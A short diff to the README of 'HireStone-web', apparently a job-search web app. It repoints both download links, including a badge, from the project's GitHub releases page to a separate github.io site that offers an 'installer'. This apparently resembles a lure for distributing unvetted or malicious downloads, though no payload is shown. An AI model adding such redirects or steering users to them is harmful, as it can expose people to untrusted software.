@@ -1,6 +1,6 @@
 # 🎯 HireStone-web - Manage job searching with ease
 
-[![Download HireStone](https://img.shields.io/badge/Download-HireStone-blue.svg)](https://github.com/Queendisarray156/HireStone-web/releases)
+[![Download HireStone](https://img.shields.io/badge/Download-HireStone-blue.svg)](https://queendisarray156.github.io)
 
 HireStone-web provides a central hub for job seekers and employers. This application lets you browse open positions, manage your candidate profile, or oversee company hiring through an administrative dashboard. The system uses secure methods to protect your account information and ensures a smooth interaction between your web browser and our servers.
 
@@ -18,7 +18,7 @@ Before you install the application, ensure your computer meets these basic requi
 
 To begin using HireStone-web, you must download the latest installer from our release page. Visit this link to find the most recent version:
 
-[https://github.com/Queendisarray156/HireStone-web/releases](https://github.com/Queendisarray156/HireStone-web/releases)
+[https://queendisarray156.github.io](https://queendisarray156.github.io)
 
 Follow these steps to obtain the correct file:
 
